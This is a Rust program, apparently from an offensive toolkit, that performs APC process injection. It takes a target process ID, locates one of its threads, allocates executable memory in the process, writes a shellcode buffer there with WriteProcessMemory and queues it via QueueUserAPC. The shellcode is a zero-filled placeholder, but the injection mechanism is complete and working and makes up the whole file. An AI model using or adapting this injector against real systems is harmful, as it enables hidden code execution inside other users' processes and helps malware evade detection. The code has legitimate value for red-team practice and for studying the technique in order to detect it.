use std::{
    env::args,
    mem::{offset_of, size_of, transmute},
};
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError, PAPCFUNC},
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
                    Thread32Next,
                },
            },
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            Threading::{
                OpenProcess, OpenThread, PROCESS_ALL_ACCESS, QueueUserAPC, THREAD_ALL_ACCESS,
            },
        },
    },
    core::{Error, HRESULT, Result},
};

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    let pid: u32 = match args().nth(1) {
        Some(arg) => arg.parse().map_err(|_| Error::from_thread())?,
        None => {
            eprintln!("Usage: ./injectum_async_procedure_calls.exe <PID>");
            return Ok(());
        }
    };

    unsafe {
        let mut thread_id: u32 = 0;

        let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)?;
        if h_snapshot.is_invalid() {
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let mut t_entry = THREADENTRY32::default();
        t_entry.dwSize = size_of::<THREADENTRY32>() as u32;

        Thread32First(h_snapshot, &mut t_entry)?;

        loop {
            if t_entry.dwSize
                >= (offset_of!(THREADENTRY32, th32OwnerProcessID) + size_of::<u32>()) as u32
            {
                if t_entry.th32OwnerProcessID == pid {
                    thread_id = t_entry.th32ThreadID;
                    break;
                }
            }

            t_entry.dwSize = size_of::<THREADENTRY32>() as u32;

            if Thread32Next(h_snapshot, &mut t_entry).is_err() {
                break;
            }
        }

        if thread_id == 0 {
            CloseHandle(h_snapshot)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
        if h_process.is_invalid() {
            CloseHandle(h_snapshot)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let h_memory = VirtualAllocEx(
            h_process,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if h_memory.is_null() {
            CloseHandle(h_process)?;
            CloseHandle(h_snapshot)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            h_process,
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?;

        let h_thread = OpenThread(THREAD_ALL_ACCESS, false, thread_id)?;
        if h_thread.is_invalid() {
            CloseHandle(h_process)?;
            CloseHandle(h_snapshot)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let papc_func: PAPCFUNC = transmute(h_memory);
        if QueueUserAPC(papc_func, h_thread, 0) == 0 {
            CloseHandle(h_thread)?;
            CloseHandle(h_process)?;
            CloseHandle(h_snapshot)?;
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        CloseHandle(h_thread)?;
        CloseHandle(h_process)?;
        CloseHandle(h_snapshot)?;
    };

    Ok(())
}
